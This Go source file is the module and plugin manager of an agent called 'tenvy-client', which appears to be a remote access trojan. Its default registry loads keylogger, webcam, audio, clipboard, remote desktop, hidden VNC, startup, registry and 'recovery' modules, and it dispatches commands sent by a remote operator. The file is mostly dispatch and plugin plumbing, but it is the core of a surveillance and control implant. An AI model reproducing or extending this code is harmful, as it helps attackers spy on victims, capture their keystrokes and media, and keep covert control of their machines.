package agent

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
	geolocationmgr "github.com/rootbay/tenvy-client/internal/modules/misc/geolocation"
	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/plugins"
	"github.com/rootbay/tenvy-client/internal/protocol"
	manifest "github.com/rootbay/tenvy-client/shared/pluginmanifest"
)

type Config struct {
	AgentID         string
	BaseURL         string
	AuthKey         string
	HTTPClient      *http.Client
	Logger          *log.Logger
	UserAgent       string
	Provider        systeminfo.AgentInfoProvider
	BuildVersion    string
	AgentConfig     protocol.AgentConfig
	Plugins         *plugins.Manager
	ActiveModules   []string
	PluginHandles   map[string]PluginActivationHandle
	Extensions      ModuleExtensionRegistry
	PluginManifests map[string]manifest.ManifestDescriptor
	Notes           *notes.Manager
	Geolocation     geolocationmgr.Config
}

func envBool(name string) bool {
	value := strings.TrimSpace(os.Getenv(name))
	switch strings.ToLower(value) {
	case "1", "true", "yes", "on":
		return true
	default:
		return false
	}
}

func envDuration(name string) time.Duration {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return 0
	}
	d, err := time.ParseDuration(value)
	if err != nil {
		return 0
	}
	return d
}

func envList(name string) []string {
	raw := os.Getenv(name)
	if strings.TrimSpace(raw) == "" {
		return nil
	}

	parts := strings.FieldsFunc(raw, func(r rune) bool {
		switch r {
		case ',', ';', '\n', '\r', '\t', ' ':
			return true
		default:
			return false
		}
	})

	if len(parts) == 0 {
		return nil
	}

	values := make([]string, 0, len(parts))
	for _, part := range parts {
		trimmed := strings.TrimSpace(part)
		if trimmed != "" {
			values = append(values, trimmed)
		}
	}
	if len(values) == 0 {
		return nil
	}
	return values
}

type ModuleCapability struct {
	ID          string
	Name        string
	Description string
}

type ModuleTelemetryDescriptor struct {
	ID          string
	Name        string
	Description string
}

type ModuleExtension struct {
	Source       string
	Version      string
	Capabilities []ModuleCapability
	Telemetry    []ModuleTelemetryDescriptor
	Hooks        ModuleExtensionHooks
}

// ModuleExtensionHooks exposes module-specific callbacks that can be wired in by
// plugins or alternate user interfaces. Hooks are optional; modules ignore
// fields they do not recognize.
type ModuleExtensionHooks struct {
	// ClientChatDelivery delivers operator messages emitted by the
	// client-chat module. Registering this hook allows plugins or UIs to
	// surface incoming operator messages locally.
	ClientChatDelivery clientchat.OperatorMessageConsumer
}

type PluginActivationHandle interface {
	Shutdown(context.Context) error
}

type PluginActivationFunc func(context.Context) error

func (f PluginActivationFunc) Shutdown(ctx context.Context) error {
	if f == nil {
		return nil
	}
	return f(ctx)
}

type ModuleExtensionRegistrar interface {
	RegisterExtension(ModuleExtension) error
}

type ModuleExtensionRegistry interface {
	RegisterModuleExtension(moduleID string, extension ModuleExtension) error
	UnregisterModuleExtension(moduleID, source string) error
}

type ModuleExtensionUnregistrar interface {
	UnregisterExtension(source string) error
}

type ModuleTelemetryRegistrar interface {
	RegisterTelemetry(source string, descriptors []ModuleTelemetryDescriptor) error
}

type ModuleTelemetryUnregistrar interface {
	UnregisterTelemetry(source string) error
}

type ModuleMetadata struct {
	ID           string
	Title        string
	Description  string
	Commands     []string
	Capabilities []ModuleCapability
	Telemetry    []ModuleTelemetryDescriptor
	Extensions   []ModuleExtension
}

type Module interface {
	ID() string
	Init(context.Context, Config) error
	Handle(context.Context, protocol.Command) error
	UpdateConfig(Config) error
	Shutdown(context.Context) error
}

type moduleMetadataProvider interface {
	Metadata() ModuleMetadata
}

type CommandResultError struct {
	Result protocol.CommandResult
}

func (e *CommandResultError) Error() string {
	if e == nil {
		return ""
	}
	if message := strings.TrimSpace(e.Result.Error); message != "" {
		return message
	}
	if e.Result.Success {
		if output := strings.TrimSpace(e.Result.Output); output != "" {
			return output
		}
		return "command completed"
	}
	return "command failed"
}

func WrapCommandResult(result protocol.CommandResult) error {
	return &CommandResultError{Result: result}
}

type moduleEntry struct {
	module               Module
	metadata             ModuleMetadata
	commands             []string
	base                 ModuleMetadata
	registrar            ModuleExtensionRegistrar
	unregistrar          ModuleExtensionUnregistrar
	telemetryRegistrar   ModuleTelemetryRegistrar
	telemetryUnregistrar ModuleTelemetryUnregistrar
	extensions           map[string]ModuleExtension
	enabled              bool
}

type pluginActivation struct {
	modules []string
	handle  PluginActivationHandle
}

func (e *moduleEntry) rebuildMetadata() {
	metadata := copyModuleMetadata(e.base)
	if len(e.extensions) > 0 {
		keys := make([]string, 0, len(e.extensions))
		for source := range e.extensions {
			keys = append(keys, source)
		}
		sort.Strings(keys)
		metadata.Extensions = make([]ModuleExtension, 0, len(keys))
		for _, source := range keys {
			ext := copyModuleExtension(e.extensions[source])
			metadata.Extensions = append(metadata.Extensions, ext)
			if len(ext.Capabilities) > 0 {
				metadata.Capabilities = append(metadata.Capabilities, ext.Capabilities...)
			}
			if len(ext.Telemetry) > 0 {
				metadata.Telemetry = append(metadata.Telemetry, copyModuleTelemetry(ext.Telemetry)...)
			}
		}
	} else {
		metadata.Extensions = nil
	}
	e.metadata = metadata
}

type appVncInputHandler interface {
	HandleInputBurst(context.Context, protocol.AppVncInputBurst) error
}

type moduleManager struct {
	mu                sync.RWMutex
	modules           map[string]*moduleEntry
	byID              map[string]*moduleEntry
	lifecycle         []*moduleEntry
	remote            *remoteDesktopModule
	remoteEntry       *moduleEntry
	appVnc            appVncInputHandler
	appEntry          *moduleEntry
	pluginActivations map[string]pluginActivation
}

func newDefaultModuleManager() *moduleManager {
	registry := newModuleManager()
	registry.register(&appVncModule{})
	registry.register(newRemoteDesktopModule(nil))
	registry.register(newAudioModule())
	registry.register(newKeyloggerModule())
	registry.register(newWebcamModule())
	registry.register(newClipboardModule())
	registry.register(newFileManagerModule())
	registry.register(newRegistryModule())
	registry.register(newEnvironmentModule())
	registry.register(newStartupModule())
	registry.register(newTaskManagerModule())
	registry.register(newTCPConnectionsModule())
	registry.register(newClientChatModule())
	registry.register(newTriggerMonitorModule())
	registry.register(newGeoModule())
	registry.register(&recoveryModule{})
	registry.register(newSystemInfoModule())
	registry.register(newNotesModule())
	return registry
}

func newModuleManager() *moduleManager {
	return &moduleManager{
		modules:           make(map[string]*moduleEntry),
		byID:              make(map[string]*moduleEntry),
		lifecycle:         make([]*moduleEntry, 0, 6),
		pluginActivations: make(map[string]pluginActivation),
	}
}

func (r *moduleManager) register(m Module) {
	provider, ok := any(m).(moduleMetadataProvider)
	if !ok {
		panic("agent module missing metadata provider")
	}
	metadata := provider.Metadata()
	moduleID := strings.TrimSpace(m.ID())
	if moduleID == "" {
		panic("agent module missing identifier")
	}
	if strings.TrimSpace(metadata.ID) == "" {
		panic("agent module missing metadata id")
	}
	if metadata.ID != moduleID {
		panic(fmt.Sprintf("module %s metadata id mismatch: %s", moduleID, metadata.ID))
	}
	commands := metadata.Commands
	if len(commands) == 0 {
		panic(fmt.Sprintf("agent module %s does not declare any commands", metadata.ID))
	}
	entry := &moduleEntry{
		module:     m,
		base:       copyModuleMetadata(metadata),
		commands:   append([]string(nil), commands...),
		extensions: make(map[string]ModuleExtension),
		enabled:    true,
	}
	entry.rebuildMetadata()
	if remote, ok := m.(*remoteDesktopModule); ok {
		r.remote = remote
		r.remoteEntry = entry
	}
	if app, ok := any(m).(appVncInputHandler); ok {
		r.appVnc = app
		r.appEntry = entry
	}
	if registrar, ok := any(m).(ModuleExtensionRegistrar); ok {
		entry.registrar = registrar
	}
	if unregistrar, ok := any(m).(ModuleExtensionUnregistrar); ok {
		entry.unregistrar = unregistrar
	}
	if telemetryRegistrar, ok := any(m).(ModuleTelemetryRegistrar); ok {
		entry.telemetryRegistrar = telemetryRegistrar
	}
	if telemetryUnregistrar, ok := any(m).(ModuleTelemetryUnregistrar); ok {
		entry.telemetryUnregistrar = telemetryUnregistrar
	}
	if _, exists := r.byID[moduleID]; exists {
		panic(fmt.Sprintf("module %s already registered", moduleID))
	}
	r.lifecycle = append(r.lifecycle, entry)
	r.byID[moduleID] = entry
	for _, command := range entry.commands {
		if strings.TrimSpace(command) == "" {
			continue
		}
		if existing, ok := r.modules[command]; ok {
			panic(fmt.Sprintf("command %q already registered by module %s", command, existing.metadata.ID))
		}
		r.modules[command] = entry
	}
}

func (r *moduleManager) SetEnabledModules(moduleIDs []string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if moduleIDs == nil {
		for _, entry := range r.lifecycle {
			entry.enabled = true
		}
		r.rebuildCommandIndexLocked()
		return
	}

	allowed := make(map[string]struct{}, len(moduleIDs))
	for _, id := range moduleIDs {
		trimmed := strings.TrimSpace(id)
		if trimmed == "" {
			continue
		}
		allowed[strings.ToLower(trimmed)] = struct{}{}
	}

	for _, entry := range r.lifecycle {
		_, ok := allowed[strings.ToLower(entry.metadata.ID)]
		entry.enabled = ok
	}

	r.rebuildCommandIndexLocked()
}

func (r *moduleManager) rebuildCommandIndexLocked() {
	r.modules = make(map[string]*moduleEntry, len(r.modules))
	for _, entry := range r.lifecycle {
		if !entry.enabled {
			continue
		}
		for _, command := range entry.commands {
			trimmed := strings.TrimSpace(command)
			if trimmed == "" {
				continue
			}
			r.modules[trimmed] = entry
		}
	}
}

func (r *moduleManager) Init(ctx context.Context, cfg Config) error {
	r.mu.Lock()
	cfg.Extensions = r
	cfg.PluginHandles = r.pluginHandlesLocked()
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.Unlock()

	var errs []error
	for _, entry := range entries {
		if !entry.enabled {
			continue
		}
		if err := entry.module.Init(ctx, cfg); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) UpdateConfig(cfg Config) error {
	r.mu.Lock()
	cfg.Extensions = r
	cfg.PluginHandles = r.pluginHandlesLocked()
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.Unlock()

	var errs []error
	for _, entry := range entries {
		if !entry.enabled {
			continue
		}
		if err := entry.module.UpdateConfig(cfg); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) Metadata() []ModuleMetadata {
	r.mu.RLock()
	defer r.mu.RUnlock()

	metadata := make([]ModuleMetadata, 0, len(r.lifecycle))
	for _, entry := range r.lifecycle {
		if !entry.enabled {
			continue
		}
		metadata = append(metadata, copyModuleMetadata(entry.metadata))
	}
	return metadata
}

func (r *moduleManager) pluginHandlesLocked() map[string]PluginActivationHandle {
	if len(r.pluginActivations) == 0 {
		return nil
	}
	handles := make(map[string]PluginActivationHandle, len(r.pluginActivations))
	for id, activation := range r.pluginActivations {
		handles[id] = activation.handle
	}
	if len(handles) == 0 {
		return nil
	}
	return handles
}

func (r *moduleManager) pluginHandleSnapshot() map[string]PluginActivationHandle {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.pluginHandlesLocked()
}

func (r *moduleManager) PluginHandle(pluginID string) PluginActivationHandle {
	pluginID = strings.TrimSpace(pluginID)
	if pluginID == "" {
		return nil
	}
	r.mu.RLock()
	activation, ok := r.pluginActivations[pluginID]
	r.mu.RUnlock()
	if !ok {
		return nil
	}
	return activation.handle
}

func (r *moduleManager) ActivePluginIDs() []string {
	r.mu.RLock()
	defer r.mu.RUnlock()
	if len(r.pluginActivations) == 0 {
		return nil
	}
	ids := make([]string, 0, len(r.pluginActivations))
	for id := range r.pluginActivations {
		ids = append(ids, id)
	}
	if len(ids) == 0 {
		return nil
	}
	sort.Strings(ids)
	return ids
}

func (r *moduleManager) RegisterModuleExtension(moduleID string, extension ModuleExtension) error {
	moduleID = strings.TrimSpace(moduleID)
	if moduleID == "" {
		return errors.New("module identifier is required")
	}
	extension.Source = strings.TrimSpace(extension.Source)
	if extension.Source == "" {
		return errors.New("extension source is required")
	}

	sanitized := copyModuleExtension(extension)
	sanitized.Capabilities = sanitizeModuleCapabilities(sanitized.Capabilities)
	sanitized.Telemetry = sanitizeModuleTelemetry(sanitized.Telemetry)

	r.mu.Lock()
	entry, ok := r.byID[moduleID]
	if !ok {
		r.mu.Unlock()
		return fmt.Errorf("module %s not registered", moduleID)
	}
	entry.extensions[sanitized.Source] = sanitized
	entry.rebuildMetadata()
	registrar := entry.registrar
	telemetryRegistrar := entry.telemetryRegistrar
	r.mu.Unlock()

	if registrar != nil {
		if err := registrar.RegisterExtension(sanitized); err != nil {
			return fmt.Errorf("module %s extension registration failed: %w", moduleID, err)
		}
	}

	if telemetryRegistrar != nil {
		if err := telemetryRegistrar.RegisterTelemetry(sanitized.Source, sanitized.Telemetry); err != nil {
			return fmt.Errorf("module %s telemetry registration failed: %w", moduleID, err)
		}
	}

	return nil
}

func (r *moduleManager) UnregisterModuleExtension(moduleID, source string) error {
	moduleID = strings.TrimSpace(moduleID)
	if moduleID == "" {
		return errors.New("module identifier is required")
	}
	source = strings.TrimSpace(source)
	if source == "" {
		return errors.New("extension source is required")
	}

	r.mu.Lock()
	entry, ok := r.byID[moduleID]
	if !ok {
		r.mu.Unlock()
		return fmt.Errorf("module %s not registered", moduleID)
	}
	unregistrar := entry.unregistrar
	telemetryUnregistrar := entry.telemetryUnregistrar
	delete(entry.extensions, source)
	entry.rebuildMetadata()
	r.mu.Unlock()

	if unregistrar != nil {
		if err := unregistrar.UnregisterExtension(source); err != nil {
			return fmt.Errorf("module %s extension removal failed: %w", moduleID, err)
		}
	}

	if telemetryUnregistrar != nil {
		if err := telemetryUnregistrar.UnregisterTelemetry(source); err != nil {
			return fmt.Errorf("module %s telemetry removal failed: %w", moduleID, err)
		}
	}

	return nil
}

func (r *moduleManager) ActivatePlugin(ctx context.Context, pluginID string, moduleExtensions map[string]ModuleExtension, handle PluginActivationHandle) error {
	pluginID = strings.TrimSpace(pluginID)
	if pluginID == "" {
		return errors.New("plugin identifier is required")
	}
	if ctx == nil {
		ctx = context.Background()
	}

	r.mu.RLock()
	_, exists := r.pluginActivations[pluginID]
	r.mu.RUnlock()
	if exists {
		if err := r.DeactivatePlugin(ctx, pluginID); err != nil {
			return err
		}
	}

	var registered []string
	for moduleID, extension := range moduleExtensions {
		moduleID = strings.TrimSpace(moduleID)
		if moduleID == "" {
			continue
		}
		if strings.TrimSpace(extension.Source) == "" {
			extension.Source = pluginID
		}
		if err := r.RegisterModuleExtension(moduleID, extension); err != nil {
			var rollbackErr error
			for _, id := range registered {
				if undoErr := r.UnregisterModuleExtension(id, pluginID); undoErr != nil {
					rollbackErr = errors.Join(rollbackErr, undoErr)
				}
			}
			if rollbackErr != nil {
				err = errors.Join(err, rollbackErr)
			}
			return err
		}
		registered = append(registered, moduleID)
	}

	r.mu.Lock()
	if r.pluginActivations == nil {
		r.pluginActivations = make(map[string]pluginActivation)
	}
	r.pluginActivations[pluginID] = pluginActivation{modules: append([]string(nil), registered...), handle: handle}
	r.mu.Unlock()
	return nil
}

func (r *moduleManager) DeactivatePlugin(ctx context.Context, pluginID string) error {
	pluginID = strings.TrimSpace(pluginID)
	if pluginID == "" {
		return errors.New("plugin identifier is required")
	}
	if ctx == nil {
		ctx = context.Background()
	}

	r.mu.Lock()
	activation, ok := r.pluginActivations[pluginID]
	if ok {
		delete(r.pluginActivations, pluginID)
	}
	r.mu.Unlock()
	if !ok {
		return nil
	}

	var errs []error
	for _, moduleID := range activation.modules {
		if err := r.UnregisterModuleExtension(moduleID, pluginID); err != nil {
			errs = append(errs, err)
		}
	}
	if activation.handle != nil {
		if err := activation.handle.Shutdown(ctx); err != nil {
			errs = append(errs, err)
		}
	}
	return errors.Join(errs...)
}

func copyModuleMetadata(metadata ModuleMetadata) ModuleMetadata {
	clone := ModuleMetadata{
		ID:           metadata.ID,
		Title:        metadata.Title,
		Description:  metadata.Description,
		Commands:     append([]string(nil), metadata.Commands...),
		Capabilities: append([]ModuleCapability(nil), metadata.Capabilities...),
		Telemetry:    copyModuleTelemetry(metadata.Telemetry),
	}
	if len(metadata.Extensions) > 0 {
		clone.Extensions = make([]ModuleExtension, 0, len(metadata.Extensions))
		for _, extension := range metadata.Extensions {
			clone.Extensions = append(clone.Extensions, copyModuleExtension(extension))
		}
	}
	return clone
}

func copyModuleExtension(extension ModuleExtension) ModuleExtension {
	return ModuleExtension{
		Source:       extension.Source,
		Version:      extension.Version,
		Capabilities: append([]ModuleCapability(nil), extension.Capabilities...),
		Telemetry:    copyModuleTelemetry(extension.Telemetry),
		Hooks:        extension.Hooks,
	}
}

func copyModuleTelemetry(descriptors []ModuleTelemetryDescriptor) []ModuleTelemetryDescriptor {
	if len(descriptors) == 0 {
		return nil
	}
	clone := make([]ModuleTelemetryDescriptor, len(descriptors))
	for i, descriptor := range descriptors {
		clone[i] = ModuleTelemetryDescriptor{
			ID:          descriptor.ID,
			Name:        descriptor.Name,
			Description: descriptor.Description,
		}
	}
	return clone
}

func sanitizeModuleCapabilities(caps []ModuleCapability) []ModuleCapability {
	if len(caps) == 0 {
		return nil
	}
	sanitized := make([]ModuleCapability, 0, len(caps))
	seen := make(map[string]struct{})
	for _, capability := range caps {
		id := strings.TrimSpace(capability.ID)
		if id == "" {
			id = strings.TrimSpace(capability.Name)
		}
		if id == "" {
			continue
		}
		key := strings.ToLower(id)
		if _, duplicate := seen[key]; duplicate {
			continue
		}
		if descriptor, ok := manifest.LookupCapability(id); ok {
			sanitized = append(sanitized, ModuleCapability{
				ID:          descriptor.ID,
				Name:        descriptor.Name,
				Description: descriptor.Description,
			})
			seen[key] = struct{}{}
			continue
		}
		name := strings.TrimSpace(capability.Name)
		if name == "" {
			name = id
		}
		sanitized = append(sanitized, ModuleCapability{
			ID:          id,
			Name:        name,
			Description: strings.TrimSpace(capability.Description),
		})
		seen[key] = struct{}{}
	}
	if len(sanitized) == 0 {
		return nil
	}
	return sanitized
}

func sanitizeModuleTelemetry(descriptors []ModuleTelemetryDescriptor) []ModuleTelemetryDescriptor {
	if len(descriptors) == 0 {
		return nil
	}
	sanitized := make([]ModuleTelemetryDescriptor, 0, len(descriptors))
	seen := make(map[string]struct{})
	for _, descriptor := range descriptors {
		id := strings.TrimSpace(descriptor.ID)
		if id == "" {
			id = strings.TrimSpace(descriptor.Name)
		}
		if id == "" {
			continue
		}
		key := strings.ToLower(id)
		if _, duplicate := seen[key]; duplicate {
			continue
		}
		if metadata, ok := manifest.LookupTelemetry(id); ok {
			sanitized = append(sanitized, ModuleTelemetryDescriptor{
				ID:          metadata.ID,
				Name:        metadata.Name,
				Description: metadata.Description,
			})
			seen[key] = struct{}{}
			continue
		}
		name := strings.TrimSpace(descriptor.Name)
		if name == "" {
			name = id
		}
		sanitized = append(sanitized, ModuleTelemetryDescriptor{
			ID:          id,
			Name:        name,
			Description: strings.TrimSpace(descriptor.Description),
		})
		seen[key] = struct{}{}
	}
	if len(sanitized) == 0 {
		return nil
	}
	return sanitized
}

func buildCapabilitySet(base []string, extensions map[string]ModuleExtension) map[string]struct{} {
	size := len(base)
	for _, ext := range extensions {
		size += len(ext.Capabilities)
	}
	capabilities := make(map[string]struct{}, size)
	for _, id := range base {
		trimmed := strings.TrimSpace(id)
		if trimmed == "" {
			continue
		}
		capabilities[strings.ToLower(trimmed)] = struct{}{}
	}
	for _, extension := range extensions {
		for _, capability := range extension.Capabilities {
			id := strings.TrimSpace(capability.ID)
			if id == "" {
				id = strings.TrimSpace(capability.Name)
			}
			if id == "" {
				continue
			}
			capabilities[strings.ToLower(id)] = struct{}{}
		}
	}
	return capabilities
}

type moduleExtensionState struct {
	mu           sync.RWMutex
	base         []string
	extensions   map[string]ModuleExtension
	capabilities map[string]struct{}
}

func newModuleExtensionState(base []string) *moduleExtensionState {
	state := &moduleExtensionState{base: append([]string(nil), base...)}
	state.capabilities = buildCapabilitySet(state.base, nil)
	return state
}

func (s *moduleExtensionState) register(extension ModuleExtension) error {
	if s == nil {
		return errors.New("module extension state not initialized")
	}
	source := strings.TrimSpace(extension.Source)
	if source == "" {
		return errors.New("extension source required")
	}

	sanitized := copyModuleExtension(extension)
	sanitized.Source = source

	s.mu.Lock()
	if s.extensions == nil {
		s.extensions = make(map[string]ModuleExtension)
	}
	s.extensions[source] = sanitized
	s.capabilities = buildCapabilitySet(s.base, s.extensions)
	s.mu.Unlock()
	return nil
}

func (s *moduleExtensionState) unregister(source string) error {
	if s == nil {
		return nil
	}
	trimmed := strings.TrimSpace(source)

	s.mu.Lock()
	if len(s.extensions) == 0 {
		if s.capabilities == nil {
			s.capabilities = buildCapabilitySet(s.base, nil)
		}
		s.mu.Unlock()
		return nil
	}
	if trimmed == "" {
		s.extensions = nil
	} else {
		delete(s.extensions, trimmed)
		if len(s.extensions) == 0 {
			s.extensions = nil
		}
	}
	s.capabilities = buildCapabilitySet(s.base, s.extensions)
	s.mu.Unlock()
	return nil
}

func (s *moduleExtensionState) hasCapability(id string) bool {
	if s == nil {
		return false
	}
	trimmed := strings.TrimSpace(strings.ToLower(id))
	if trimmed == "" {
		return true
	}

	s.mu.RLock()
	capabilities := s.capabilities
	s.mu.RUnlock()
	if capabilities == nil {
		s.mu.Lock()
		if s.capabilities == nil {
			s.capabilities = buildCapabilitySet(s.base, s.extensions)
		}
		capabilities = s.capabilities
		s.mu.Unlock()
	}
	_, ok := capabilities[trimmed]
	return ok
}

func (s *moduleExtensionState) hasAnyCapability(ids ...string) bool {
	for _, id := range ids {
		if s.hasCapability(id) {
			return true
		}
	}
	return false
}

type moduleTelemetryRegistry struct {
	mu      sync.Mutex
	entries map[string][]ModuleTelemetryDescriptor
}

func newModuleTelemetryRegistry() *moduleTelemetryRegistry {
	return &moduleTelemetryRegistry{}
}

func (r *moduleTelemetryRegistry) register(source string, descriptors []ModuleTelemetryDescriptor) error {
	if r == nil {
		return errors.New("module telemetry registry not initialized")
	}
	source = strings.TrimSpace(source)
	if source == "" {
		return errors.New("telemetry source required")
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	if len(descriptors) == 0 {
		if r.entries != nil {
			delete(r.entries, source)
			if len(r.entries) == 0 {
				r.entries = nil
			}
		}
		return nil
	}
	clones := copyModuleTelemetry(descriptors)
	if r.entries == nil {
		r.entries = make(map[string][]ModuleTelemetryDescriptor)
	}
	r.entries[source] = clones
	return nil
}

func (r *moduleTelemetryRegistry) unregister(source string) error {
	if r == nil {
		return nil
	}
	trimmed := strings.TrimSpace(source)
	r.mu.Lock()
	if len(r.entries) == 0 {
		r.entries = nil
		r.mu.Unlock()
		return nil
	}
	if trimmed == "" {
		r.entries = nil
	} else {
		delete(r.entries, trimmed)
		if len(r.entries) == 0 {
			r.entries = nil
		}
	}
	r.mu.Unlock()
	return nil
}

func capabilityUnavailableResult(cmd protocol.Command, moduleID string, capabilities ...string) protocol.CommandResult {
	detail := "required capability"
	if len(capabilities) == 1 {
		detail = capabilities[0]
	} else if len(capabilities) > 1 {
		detail = strings.Join(capabilities, ", ")
	}
	return protocol.CommandResult{
		CommandID:   cmd.ID,
		Success:     false,
		Error:       fmt.Sprintf("%s capability %s requires a registered extension", moduleID, detail),
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
}

func (r *moduleManager) HandleCommand(ctx context.Context, cmd protocol.Command) (bool, protocol.CommandResult) {
	r.mu.RLock()
	entry, ok := r.modules[cmd.Name]
	r.mu.RUnlock()
	if !ok || !entry.enabled {
		return false, protocol.CommandResult{}
	}
	return true, r.wrapCommandResult(cmd, entry.module.Handle(ctx, cmd))
}

func (r *moduleManager) Shutdown(ctx context.Context) error {
	r.mu.RLock()
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.RUnlock()

	var errs []error
	for index := len(entries) - 1; index >= 0; index-- {
		if !entries[index].enabled {
			continue
		}
		if err := entries[index].module.Shutdown(ctx); err != nil {
			label := entries[index].metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entries[index].metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	r.mu.RLock()
	pluginIDs := make([]string, 0, len(r.pluginActivations))
	for id := range r.pluginActivations {
		pluginIDs = append(pluginIDs, id)
	}
	r.mu.RUnlock()

	for _, pluginID := range pluginIDs {
		if err := r.DeactivatePlugin(ctx, pluginID); err != nil {
			errs = append(errs, err)
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) wrapCommandResult(cmd protocol.Command, err error) protocol.CommandResult {
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
	if err == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     true,
			CompletedAt: completedAt,
		}
	}

	var resultErr *CommandResultError
	if errors.As(err, &resultErr) {
		result := resultErr.Result
		if strings.TrimSpace(result.CommandID) == "" {
			result.CommandID = cmd.ID
		}
		if strings.TrimSpace(result.CompletedAt) == "" {
			result.CompletedAt = completedAt
		}
		return result
	}

	return protocol.CommandResult{
		CommandID:   cmd.ID,
		Success:     false,
		Error:       err.Error(),
		CompletedAt: completedAt,
	}
}

func (r *moduleManager) remoteDesktopModule() *remoteDesktopModule {
	r.mu.RLock()
	defer r.mu.RUnlock()
	if r.remoteEntry != nil && !r.remoteEntry.enabled {
		return nil
	}
	return r.remote
}

func (r *moduleManager) appVncModule() appVncInputHandler {
	r.mu.RLock()
	defer r.mu.RUnlock()
	if r.appEntry != nil && !r.appEntry.enabled {
		return nil
	}
	return r.appVnc
}
